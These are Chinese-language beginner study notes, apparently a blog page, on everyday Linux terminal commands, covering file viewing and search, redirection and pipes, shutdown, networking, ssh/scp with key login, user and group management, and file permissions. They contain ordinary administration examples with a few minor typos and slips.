<h4 id="4-2-cp"><a href="#4-2-cp" class="headerlink" title="4.2 cp"></a>4.2 cp</h4><table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-i</strong></td>
<td><strong>覆盖文件时候提示是否覆盖</strong></td>
</tr>
<tr>
<td>-r</td>
<td>复制文件时在cp后面加-r    复制完成的文件会把源文件下所有子目录和文件复制过去  ，但目标文件需要重命名。</td>
</tr>
</tbody></table>
<h4 id="4-3-mv"><a href="#4-3-mv" class="headerlink" title="4.3 mv"></a><strong>4.3 mv</strong></h4><p><strong>mv</strong>命令可以用来<strong>移动文件或者目录</strong>，也可以给文件或者<strong>目录重命名</strong>。</p>
<p><strong>mv</strong>命令后加<strong>-i</strong> 可以<strong>提示是否覆盖文件或者目录</strong>以防发生覆盖错误。</p>
<p><strong>使用mv命令时如果加入-i 出现存在文件会提示我们是否覆盖，这样在使用的时候会更加安全。因为文件或目录覆盖和删除后时没办法恢复的。</strong></p>
<h3 id="05-查看文件内容、"><a href="#05-查看文件内容、" class="headerlink" title="05 查看文件内容、"></a>05 查看文件内容、</h3><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>cat  文件名</td>
<td>查看文件内容、创建文件、文件合并、追加文件内容等功能</td>
</tr>
<tr>
<td>more  文件名</td>
<td>分屏显示文件内容</td>
</tr>
<tr>
<td>grep  搜索内容<br>文件名</td>
<td>搜索文本文件内容</td>
</tr>
</tbody></table>
<h4 id="5-1-cat"><a href="#5-1-cat" class="headerlink" title="5.1 cat"></a>5.1 cat</h4><p><strong>cat 查看文件内容、创建文件、文件合并、追加文件内容等功能</strong></p>
<p><strong>cat  会一次显示所有的内容，适合 查看内容较少的文本文件</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-b</strong></td>
<td><strong>对非空输出行编号</strong>     将空开的行不给予行号</td>
</tr>
<tr>
<td><strong>-n</strong></td>
<td><strong>对输出的所有行编号</strong>      将所有行都给予行号</td>
</tr>
</tbody></table>
<p><strong>Linux 中还有一个nl的命令和cat  -b  的效果等价</strong></p>
<h4 id="5-2-more"><a href="#5-2-more" class="headerlink" title="5.2 more"></a>5.2 more</h4><p><strong>more命令可以用于分屏显示文件内容，每次只显示一页内容</strong></p>
<p><strong>适合查看内容较多的文本文件</strong></p>
<table>
<thead>
<tr>
<th><strong>操作键</strong></th>
<th><strong>功能</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>空格键</strong></td>
<td><strong>显示手册页的下一屏</strong></td>
</tr>
<tr>
<td><strong>回车键</strong></td>
<td><strong>一次滚动手册页的一行</strong></td>
</tr>
<tr>
<td><strong>b</strong></td>
<td><strong>回滚一屏</strong></td>
</tr>
<tr>
<td><strong>f</strong></td>
<td><strong>前滚一屏</strong></td>
</tr>
<tr>
<td><strong>q</strong></td>
<td><strong>退出</strong></td>
</tr>
<tr>
<td><strong>/word</strong></td>
<td><strong>搜索  word字符串</strong></td>
</tr>
</tbody></table>
<p>空格键和F键功能是一样的。</p>
<h4 id="5-3-grep"><a href="#5-3-grep" class="headerlink" title="5.3 grep"></a>5.3 grep</h4><p><strong>Linux 系统中 grep 命令是一种强大的文本搜索工具</strong></p>
<p><strong>grep  允许对文本文件进行 模式查找，所谓模式查找，又被称为正则表达式，</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>-n</strong></td>
<td><strong>显示匹配行及行号         既显示内容又显示行号</strong></td>
</tr>
<tr>
<td><strong>-v</strong></td>
<td><strong>显示不包含匹配文本的所有行（相当于取反搜索）         省略你想要搜索的内容</strong></td>
</tr>
<tr>
<td>-i</td>
<td><strong>忽略大小写</strong></td>
</tr>
</tbody></table>
<p><strong>grep 可以查找文本中你想要找到的内容</strong></p>
<p><u><strong>grep  -vn   将-n和-v 合并 显示行号但不显示你所查找的内容</strong></u></p>
<p><strong>grep  -i 的时候 如果搜索内容中间有空格需要用引号将你所要搜索的内容引起来。</strong></p>
<p>常用的两种模式查找</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>^a</strong></td>
<td><strong>行首，搜索以a开头的行</strong></td>
</tr>
<tr>
<td><strong>ke$</strong></td>
<td><strong>行尾，搜索以ke结束的行</strong></td>
</tr>
</tbody></table>
<p><strong>^(你所要找的行首内容)</strong></p>
<p><strong>(你所要找的行尾内容)$</strong></p>
<h3 id="0-6其他"><a href="#0-6其他" class="headerlink" title="0.6其他"></a>0.6其他</h3><h4 id="6-1-echo-文字内容"><a href="#6-1-echo-文字内容" class="headerlink" title="6.1  echo 文字内容"></a>6.1  echo 文字内容</h4><p>echo 会在终端中显示参数指定的文字，通常会和  <strong>重定向</strong>  联合使用</p>
<p>ceho  是将你想要显示指定文字在显示一边         <strong>echo 很少会单独使用</strong></p>
<h4 id="6-2重定向-gt-和-gt-gt"><a href="#6-2重定向-gt-和-gt-gt" class="headerlink" title="6.2重定向  &gt; 和  &gt;&gt;"></a>6.2重定向  &gt; 和  &gt;&gt;</h4><p>Linux 允许将命令执行结果 <strong>重定向</strong>  到一个<strong>文件</strong></p>
<p>将本应显示在<strong>终端上的内容输出  /   追加到指定文件中</strong></p>
<p>·       &gt; 表示输出，会覆盖你源文件的全部内容。</p>
<p>·       &gt;&gt;表示追加，会将内容追加到已有文件的末尾.</p>
<p>使用  &gt;  时 要谨慎使用，防止将重要文件覆盖。</p>
<p>在你想要使用  &gt;     &gt;&gt;     等命令后面加上文件名</p>
<h4 id="6-3-管道"><a href="#6-3-管道" class="headerlink" title="6.3 管道|"></a>6.3 管道|</h4><p>Linux 允许将  <strong>一个命令的输出</strong>  可以 <strong>通过管道</strong>  做为  <strong>另一个命令的输入</strong></p>
<p>这里|可以理解为管子，<strong>左端塞东西（写），右端去东西（读）</strong></p>
<p>常用管道命令：</p>
<p><strong>more：</strong>分屏显示内容</p>
<p><strong>grep：</strong>在命令执行结果的基础上查询指定的文本。 </p>
<h2 id="远程管理常用命令"><a href="#远程管理常用命令" class="headerlink" title="远程管理常用命令"></a>远程管理常用命令</h2><h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h4><ul>
<li><strong>关机/重启</strong><ul>
<li>shutdown</li>
</ul>
</li>
<li><strong>查看或配置网卡信息</strong><ul>
<li>ifconfig</li>
<li>ping</li>
</ul>
</li>
<li><strong>远程登陆和复制文件</strong><ul>
<li>ssh</li>
<li>scp</li>
</ul>
</li>
</ul>
<h4 id="01-关机-重启"><a href="#01-关机-重启" class="headerlink" title="01.关机/重启"></a>01.关机/重启</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>shutdown   选项   时间</td>
<td>关机/重新启动</td>
</tr>
</tbody></table>
<p>想要重新启动电脑或者关闭电脑可以在终端中先输入<strong>shutdown</strong>  在指令选项<strong>（关机/重启）</strong>并接上一个关机<strong>/重新启动的时间</strong></p>
<p>如果向立即关闭 电脑  只需要在   <strong>shutdown 关机/重启电脑  now</strong>       只需要在时间那里输入一个<strong>now。</strong></p>
<p>如果  <strong>不指令任何选项</strong>，默认的将会是<strong>关机</strong>，</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-r</td>
<td>重新启动</td>
</tr>
</tbody></table>
<p>如果想要<strong>重启电脑</strong>，只需要<strong>加入一个 -r</strong> 的指令。</p>
<p><strong>提示：</strong></p>
<ul>
<li><p>如果不指定时间参数，系统默认一分钟之后关闭电脑                          如果后悔   在shutdown  后面加-c  表示取消关机    而这个操作需要在一分钟之内完成，也就是关机之前完成操作。</p>
</li>
<li><p><strong>远程维护服务器时，最好不好关闭系统，而应该重新启动系统</strong>          我们在输入  <strong>shutdown</strong>  指令时千万不要忘记输入 <strong>-r 指令</strong>     如果<strong>忘记输入-r</strong>  立刻加 <strong>-c 取消关机</strong></p>
</li>
<li><p>常用命令示例</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  重新启动操作系统，其中 now 表示现在立即</span><br><span class="line">$  shutdown -r now</span><br><span class="line"></span><br><span class="line">#  立即关机，其中 now 表示现在</span><br><span class="line">$  shutdown now</span><br><span class="line"></span><br><span class="line">#  系统在今天的20：25会关机</span><br><span class="line">$  shutdown 20:25</span><br><span class="line"></span><br><span class="line">#  系统在过十分钟自动关机</span><br><span class="line">$  shutdown +10</span><br><span class="line"></span><br><span class="line">#  取消之前指定的关机计划</span><br><span class="line">$  shutdown -c</span><br></pre></td></tr></table></figure>

<h4 id="02-查看或配置网卡信息"><a href="#02-查看或配置网卡信息" class="headerlink" title="02.查看或配置网卡信息"></a>02.查看或配置网卡信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>ifconfig</td>
<td>查看/配置计算机当前的网卡配置信息</td>
</tr>
<tr>
<td>ping ip地址</td>
<td>检测到目标 ip地址的链接是否正常</td>
</tr>
</tbody></table>
<h5 id="2-1-网卡和IP地址"><a href="#2-1-网卡和IP地址" class="headerlink" title="2.1 网卡和IP地址"></a>2.1 网卡和IP地址</h5><p><strong>网卡</strong></p>
<ul>
<li>网卡是一个专门负责网络通讯的硬件设备</li>
<li>IP地址是设置在网卡上的地址信息</li>
</ul>
<blockquote>
<p>我们可以把电脑比作电话，网卡相当于SIM卡，ip地址相当于电话号码</p>
</blockquote>
<h5 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h5><ul>
<li>每台联网的电脑上都有ip地址，是帮正电脑之间正常通讯的重要设置</li>
</ul>
<blockquote>
<p>注意：每台电脑的ip地址不能相同，否则会出现ip冲突，并且没有办法正常通讯。</p>
</blockquote>
<h5 id="2-2-ifconfig"><a href="#2-2-ifconfig" class="headerlink" title="2.2  ifconfig"></a>2.2  ifconfig</h5><p>ifconfig 可以查看/配置计算机当前的网卡配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看网卡配置信息</span><br><span class="line">$ ifconfig</span><br><span class="line"></span><br><span class="line"># 查看网卡对应的Ip地址</span><br><span class="line">$ ifconfig | grep inet</span><br></pre></td></tr></table></figure>

<p><strong>inet  地址 是IP地址</strong>，如果内容太多<strong>只想显示ip地址</strong>命令，可以<strong>利用管道命令</strong>来显示。</p>
<blockquote>
<p>提示：一台计算机中有可能会有一个 <strong>物理网卡</strong>  和  <strong>多个虚拟网卡</strong>， 在Linux 中物理网卡的名字通常以   <strong>ensXX</strong>  表示</p>
</blockquote>
<ul>
<li><strong>127.0.0.1</strong>  被称为 <strong>本地回环/环回地址</strong>，一般用来测试本机网卡是否正常</li>
</ul>
<h4 id="2-3-ping"><a href="#2-3-ping" class="headerlink" title="2.3 ping"></a>2.3 ping</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  检测到目标主机是否连接正常</span><br><span class="line">$  ping  IP地址</span><br><span class="line"></span><br><span class="line">#  检测本地网卡工作正常</span><br><span class="line">$  ping 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>ping   一般用于检测当前计算机到目标计算机之间的网络  <strong>是否通畅</strong>，  <strong>数值越大</strong> ， <strong>速度越慢</strong>  。</li>
</ul>
<p>要使用 <strong>ping命令</strong>，必须要知道<strong>目标主机的 IP地址</strong></p>
<p>意思是，目标主机无法到达。也就是说 当前ip地址和我们计算机并没有网络连接。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574847706399.png" alt="1574841281576"></p>
<p>如果使用  <strong>ping  127.0.0.1</strong>  有回馈就说明我们本地网卡是通的。</p>
<h4 id="3-1-ssh-基础-（重点内容）"><a href="#3-1-ssh-基础-（重点内容）" class="headerlink" title="3.1  ssh 基础 （重点内容）"></a>3.1  ssh 基础 （重点内容）</h4><p>在Linux 中 SSH 是<strong>非常常用</strong> 的工具，通过 <strong>SSH客户端</strong> 我们可以连接到运行了<strong>SSH服务器</strong> 的<strong>远程机器上</strong></p>
<p>SSH是个<strong>软件</strong>不管是客户端还是服务器</p>
<p><strong>工作方式：</strong>当两个软件安装到位之后，我们就可以在自己的电脑上通过网络远程登录到服务器上，对服务器进行日常管理和维护。     在Ubuntu中SSH是默认安装的   只有在windows系统下需要专门安装客户端进行远程维护。<img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574841281576.png" alt="1574847706399"></p>
<ul>
<li><p>SSH是目前较可靠， <strong>专为远程登录会话和其他网络服务</strong> 提供安全性的协议</p>
<ul>
<li>利用SSH协议  可以<strong>有效防止远程管理过程中的信息泄露</strong></li>
<li>通过SSH协议  可以对所有传输的数据进行加密，也能够防止DNS欺骗和 IP 欺骗</li>
</ul>
</li>
<li><p>SSH 的另一项优点是传输的数据可以是经过压缩的，所以也可以加快传输的速度</p>
</li>
</ul>
<h4 id="1）域名-和-端口号"><a href="#1）域名-和-端口号" class="headerlink" title="1）域名  和  端口号"></a>1）域名  和  端口号</h4><p><strong>域名</strong></p>
<ul>
<li>由一串 用点分隔 的名字组成，例如：<a href="http://www.itcast.cn" target="_blank" rel="noopener">www.itcast.cn</a></li>
<li>是IP地址的别名，方便用户记忆</li>
</ul>
<p><strong>端口号</strong></p>
<ul>
<li><p><strong>IP地址</strong>：通过 <strong>IP地址</strong> 找到网络上的 计算机</p>
</li>
<li><p><strong>端口号</strong>：通过  <strong>端口号</strong> 可以找到 <strong>计算机上运行的应用程序</strong>            <strong>ip</strong>  地址：<strong>端口号</strong>         这两个命令一个不能少    <strong>每个服务器都有默认的端口</strong>，如果我们在<strong>访问服务器的时候没有指定端口</strong>，那它用的则是<strong>默认端口</strong>。</p>
<ul>
<li><strong>SSH服务器</strong>的默认端口是22，如果是默认端口号，再连接的时候，可以省略</li>
</ul>
</li>
<li><p>常见的服务器端口号列表：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
</tr>
</thead>
<tbody><tr>
<td>SSH服务器</td>
<td>22</td>
</tr>
<tr>
<td>Web服务器</td>
<td>80</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443</td>
</tr>
<tr>
<td>FTP服务器</td>
<td>21</td>
</tr>
</tbody></table>
<h4 id="2）SSH-客户端的简单使用"><a href="#2）SSH-客户端的简单使用" class="headerlink" title="2）SSH 客户端的简单使用"></a>2）SSH 客户端的简单使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh [-p port] user@remote</span><br><span class="line">如果 你所用的port 就是默认端口号 前面的-p可以省略，如果不是则需要加上-p  跟上指定端口号。</span><br></pre></td></tr></table></figure>

<ul>
<li>user  是在远程机器上的用户名，如果不指定的话默认为当前用户</li>
<li>remote 是远程机器的地址，可以是 <strong>ip/域名</strong>，或者是  <strong>别名</strong></li>
<li>port <strong>是SSH Server 监听的端口</strong>，如果不指定，就为默认值22</li>
</ul>
<blockquote>
<p>提示：</p>
<ul>
<li><p>使用exit 退出当前用户的登录</p>
<p>注意：</p>
</li>
</ul>
</blockquote>
<ul>
<li>ssh  这个终端命令 只能在linux   或者  unix  系统下使用</li>
<li>如果在Windows系统中，可以安装PuTTY或者 XShell 客户端软件即可</li>
</ul>
<p>提示：</p>
<p>在工作中，SSH服务器的端口号很有可能 不是22，如果遇到这种情况就需要使用 -p 选项，指定正确的端口号，否侧无法正常连接到服务器。</p>
<h4 id="3）Windows下SSH客户端的安装"><a href="#3）Windows下SSH客户端的安装" class="headerlink" title="3）Windows下SSH客户端的安装"></a>3）Windows下SSH客户端的安装</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574854673783.png" alt="1574854673783"></p>
<h4 id="3-2-scp-（掌握）"><a href="#3-2-scp-（掌握）" class="headerlink" title="3.2  scp （掌握）"></a>3.2  scp （掌握）</h4><ul>
<li>scp是一个在Linux下用来进行  <strong>远程拷贝文件</strong> 的命令</li>
<li>它的 <strong>地址格式与 ssh 基本相同</strong> ，<strong>需要注意的是</strong>，在<strong>指定端口时</strong>用的是<strong>大写的 -P</strong>而不是小写的。</li>
</ul>
<p><strong>可以将我们的文件拷贝到服务器里，也可以将服务器里的文件拷贝到我们的客户端</strong><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574923969548.png" alt="1574855460765"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 把本地当前目录下的11245.txt文件 复制到 远程 家目录下的 文档&#x2F;11245.txt</span><br><span class="line"># 注意：“：”后面的路径如果不是绝对路径，则以用户的家目录做为参照路径</span><br><span class="line">scp -P port 1124.txt user@remote：桌面&#x2F;11245.txt</span><br><span class="line"></span><br><span class="line">#把远程 家目录下的 桌面&#x2F;1124.txt 文件 复制到  本地当前目录下的 11245.txt</span><br><span class="line">scp -P pore user@remote:桌面&#x2F;11245.txt 11245.txt</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-r</td>
<td>如给出的源文件是目录文件，则scp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</td>
</tr>
<tr>
<td>-p</td>
<td>若远程SSH服务器的端口不是22，需要使用大写字母-P选项指定端口</td>
</tr>
</tbody></table>
<h4 id="SSH-高级-（知道）"><a href="#SSH-高级-（知道）" class="headerlink" title="SSH  高级 （知道）"></a>SSH  高级 （知道）</h4><p>SSH配置信息都保存在用户家目录下的 <strong>.ssh</strong> 目录下</p>
<p><strong>免密码登录</strong>      <strong>scp -p 22  用户名/ip</strong>     <strong>cat known_hosts(记录第一次连接主机的授权码)</strong>ls</p>
<p><strong>配置公钥</strong></p>
<p><strong>执行 ssh-keygen即可生成SSH钥匙，一路回车即可</strong></p>
<p><strong>上传公钥到服务器</strong></p>
<p><strong>执行 ssh-copy-id -p 用户名@ip ，可以让远程服务器记住我们的公钥</strong></p>
<p><strong>公钥和私钥</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574855460765.png" alt="1574923969548"></p>
<p>进行免密码登录<strong>首先执行ssh-keygen</strong>这个命令，这个命令可以生成两个文件，一个<strong>带点的一个 id_rsa.pub</strong></p>
<p>一个<strong>不带点的id_rsa</strong>     而<strong>带点的文件我们称他为公钥</strong>，而<strong>不带点的文件我们称他为私钥</strong>。</p>
<p>所谓公钥就是公共加密的钥匙，而私钥就是私用加密的钥匙</p>
<p>使用公钥加密的钥匙，我们必须要用私钥进行解密，而反过来呢，使用私钥加密的钥匙，我们必须要用公钥解密</p>
<h4 id="2-配置别名"><a href="#2-配置别名" class="headerlink" title="2)配置别名"></a>2)配置别名</h4><p>每次输入 ssh -p port user@remote, 时间久了会觉得很麻烦，特别是当 ueer 和port都得输入，还不好记忆。</p>
<p>而<strong>配置别名</strong>可以让我们进一步偷懒，譬如 <strong>ssh mac</strong>  来代替上面这么一长串，那么就</p>
<p>在<strong>~/.ssh/config</strong>  里面追加以下内容：</p>
<p><strong>Host mac HostName ip 地址</strong></p>
<p><strong>User itheima</strong> </p>
<p><strong>port 22</strong></p>
<p><strong>保存之后即可用  ssh mac 实现远程登录了，scp同样可以使用</strong></p>
<h4 id="用户和权限的基本概念"><a href="#用户和权限的基本概念" class="headerlink" title="用户和权限的基本概念"></a>用户和权限的基本概念</h4><h6 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h6><p>用户是Linux 系统工作中重要的一环，用户管理包括 <strong>用户</strong> 与 <strong>组</strong> 管理</p>
<p>在Linux系统中，不论是由本机或是远程登陆系统，每个系统都必须拥有一个账号并且<strong>对于不同的系统资源拥有不同的使用权限</strong></p>
<p>在Linux中，可以指定 <strong>每一个用户</strong> 针对 <strong>不用的文件或者目录</strong> 的 <strong>不同权限</strong></p>
<p>对 文件/目录 的而权限包括：</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>英文</th>
<th>缩写</th>
<th>数字代号</th>
</tr>
</thead>
<tbody><tr>
<td>读</td>
<td>read</td>
<td>r</td>
<td>4</td>
</tr>
<tr>
<td>写</td>
<td>write</td>
<td>w</td>
<td>2</td>
</tr>
<tr>
<td>执行</td>
<td>excute</td>
<td>x</td>
<td>1</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938261680.png" alt="1574938261680"></p>
<h4 id="1-3-ls-l扩展"><a href="#1-3-ls-l扩展" class="headerlink" title="1.3  ls -l扩展"></a>1.3  ls -l扩展<img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574939435311.png" alt="1574938317879"></h4><p><strong>r</strong>    <strong>表示可读</strong>的意思     <strong>w</strong>  <strong>表示可写</strong>的意思     <strong>x</strong>     <strong>表示可执行</strong>的意思     <img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938317879.png" alt="1574938449496"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575000296459.png" alt="1574939435311"></p>
<h4 id="1-4-chmod-简单使用（重要）"><a href="#1-4-chmod-简单使用（重要）" class="headerlink" title="1.4  chmod 简单使用（重要）"></a>1.4  chmod 简单使用（重要）</h4><p>chmod 可以修改 <strong>用户/组</strong> 对 <strong>文件/目录</strong> 的权限</p>
<p>命令格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +&#x2F;-rwx 文件名|目录名</span><br></pre></td></tr></table></figure>

<p>gedit  打开文件  可以进行编写。</p>
<h4 id="1-5-超级用户"><a href="#1-5-超级用户" class="headerlink" title="1.5 超级用户"></a>1.5 超级用户</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574946317982.png" alt="1574946317982"></p>
<h4 id="0-2-组管理终端命令"><a href="#0-2-组管理终端命令" class="headerlink" title="0.2 组管理终端命令"></a>0.2 组管理终端命令</h4><p>创建 <strong>组/删除组</strong> 的终端命令都需要  <strong>sudo</strong> 执行    </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1574938449496.png" alt="1575000296459"></p>
<p><strong>ch表示修改 grp 表示组  -R  文件  目录名</strong></p>
<p>提示：</p>
<p>组信息保<strong>存在/etc/group 文件中</strong></p>
<p><strong>/etc 目录是专门用来保存 系统配置信息</strong> 的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575000932771.png" alt="1575000932771"></p>
<h4 id="0-3-创建用户-设置密码-删除用户"><a href="#0-3-创建用户-设置密码-删除用户" class="headerlink" title="0.3 创建用户/设置密码/删除用户"></a>0.3 创建用户/设置密码/删除用户</h4><p>add 表示添加的意思 </p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>useradd -m -g 组名 新建用户名</td>
<td>添加新用户</td>
<td>-m 自动建立用户家目录<br>-g用户所在的组</td>
</tr>
<tr>
<td>passwd 用户名</td>
<td>设置用户密码</td>
<td>如果是普通用户，直接用passwd<br>可以修改自己的账户密码</td>
</tr>
<tr>
<td>userdel -r 用户名</td>
<td>删除用户</td>
<td>-r 选项会自动删除用户家目录</td>
</tr>
<tr>
<td>cat /etc/passwd | grep 用户名</td>
<td>确认用户信息</td>
<td>新建用户后，用户信息会保存在/etc/passwd文件中</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575079659167.png" alt="1575078286479"></p>
<h4 id="3-2-查看用户信息"><a href="#3-2-查看用户信息" class="headerlink" title="3.2 查看用户信息"></a>3.2 查看用户信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>id [用户名]</td>
<td>查看用户UID和GID信息</td>
</tr>
<tr>
<td>who</td>
<td>查看当前所有登录的用户列表</td>
</tr>
<tr>
<td>whoami</td>
<td>查看当前登录用户的账户名</td>
</tr>
</tbody></table>
<p><strong>passwd</strong> <strong>文件</strong></p>
<p>/etc/passwd  文件存放的是用户的信息，由6个分号组成的7个信息，分别是：</p>
<p>1.用户名    </p>
<p>2.密码（x，表示加密的密码）</p>
<p>3.UID（用户标识）</p>
<p>4.GID（组标识）</p>
<p>5.用户全名或者本地账号</p>
<p>6.家目录</p>
<p>7.登录使用的Shell，就是登录之后，使用的只能终端命令，Ubuntu默认是dash</p>
<h5 id="在passwd中是以冒号来分组信息的每一个冒号分隔一个信息"><a href="#在passwd中是以冒号来分组信息的每一个冒号分隔一个信息" class="headerlink" title="在passwd中是以冒号来分组信息的每一个冒号分隔一个信息"></a>在passwd中是以冒号来分组信息的每一个冒号分隔一个信息</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575078286479.png" alt="1575079659167"></p>
<p><strong>介绍</strong>：</p>
<p>一开始  表示当前用户名，第二个 x 表示这个用户是有密码的，但是密码是加密的，第三个1001表示用户名的代号，后面的1001表示lisi这个用户所归属的组的代号，：：这一列是空的表示lisi用户的全名，如果没有设置就用用户名做为lisi的全名    /home/lisi   表示用户所在的家目录</p>
<p><strong>usermod</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575177656536.png" alt="1575080878199"></p>
<p>usermod <strong>-g</strong>  组  用户名   <strong>修改的是主组</strong></p>
<p>usermod <strong>-G</strong>  组  用户名   <strong>修改的是附加组</strong>            </p>
<h4 id="which（重要）"><a href="#which（重要）" class="headerlink" title="which（重要）"></a>which（重要）</h4><p>/etc/passwd 用于保存用户信息的文件</p>
<p>/usr/bin/passwd 用于修改用户密码的程序</p>
<p><strong>which 命令可以查询我们能执行终端命令所在位置。</strong></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575080878199.png" alt="1575083593355"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575083593355.png" alt="1575083562422"></p>
<h4 id="3-3-切换用户"><a href="#3-3-切换用户" class="headerlink" title="3.3 切换用户"></a>3.3 切换用户</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>su - 用户名</td>
<td>切换用户，并且切换目录</td>
<td>- 可以切换到用户家目录，否则保持位置不变</td>
</tr>
<tr>
<td>exit</td>
<td>退出当前登录账户</td>
<td></td>
</tr>
</tbody></table>
<p><strong>su 不接用户名，可以切换到root身份</strong>，root对系统所有资源都有管理权限，不推荐使用，因为不安全。</p>
<h4 id="0-4-修改文件权限"><a href="#0-4-修改文件权限" class="headerlink" title="0.4 修改文件权限"></a>0.4 修改文件权限</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><strong>chown</strong></td>
<td><strong>修改拥有者</strong></td>
</tr>
<tr>
<td><strong>chgrp</strong></td>
<td><strong>修改组</strong></td>
</tr>
<tr>
<td><strong>chmod</strong></td>
<td><strong>修改权限</strong></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 修改文件 | 目录拥有者</span><br><span class="line">chown 用户名 文件名 | 目录名	</span><br><span class="line"></span><br><span class="line"># 递归修改文件|目录的组</span><br><span class="line">chgrp -R 组名 文件名|目录名</span><br><span class="line"></span><br><span class="line">#递归修改文件权限</span><br><span class="line">chmod -R 755 文件名|目录名</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>chmod 在设置权限时</strong>，可以简单地使用三个数字分别对应 <strong>7表示拥有者的意思第二个5表示组的意思</strong> 和 <strong>第三个5表示其他用户的权限</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   chmod+&#x2F;-rwx 可以直接修改文件|目录的  读|写|执行 权限，但是不能精确到 拥有者|组|其他</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1575083562422.png" alt="1575177656536"></p>
<h2 id="系统信息相关命令"><a href="#系统信息相关命令" class="headerlink" title="系统信息相关命令"></a>系统信息相关命令</h2><p>学习目标</p>
<p>通过远程终端维护服务器时，查看服务器上当前 <strong>系统日期和时间/磁盘空间占用情况/程序执行情况</strong></p>
<p>本小结学习的终端命令进本都是查询命令，通过这些命令对系统资源的使用情况有个了解</p>
<h4 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h4><ul>
<li><p>时间和日期</p>
<ul>
<li>date</li>
<li>cal</li>
</ul>
</li>
<li><p>磁盘和目录空间</p>
<ul>
<li>df</li>
<li>du</li>
</ul>
</li>
<li><p>进程信息</p>
<ul>
<li>ps</li>
<li>top</li>
<li>kill</li>
</ul>
</li>
</ul>
<h5 id="01-时间和日期"><a href="#01-时间和日期" class="headerlink" title="01.时间和日期"></a>01.时间和日期</h5><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>date</td>
<td>查看系统时间</td>
</tr>
<tr>
<td>cal</td>
<td>calendar 查看日历，-y选项可以查看一年的日历</td>
</tr>
</tbody></table>
<h4 id="02-磁盘信息"><a href="#02-磁盘信息" class="headerlink" title="02.磁盘信息"></a>02.磁盘信息</h4><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>df -h</td>
<td>显示磁盘剩余空间</td>
</tr>
<tr>
<td>du -h [目录名]</td>
<td>显示目录下的文件大小</td>
</tr>
</tbody></table>
<ul>
<li>选项说明    </li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-h</td>
<td>以人性化的方式显示文件大小</td>
</tr>
</tbody></table>
<h4 id="03-进程信息"><a href="#03-进程信息" class="headerlink" title="03.进程信息"></a>03.进程信息</h4><ul>
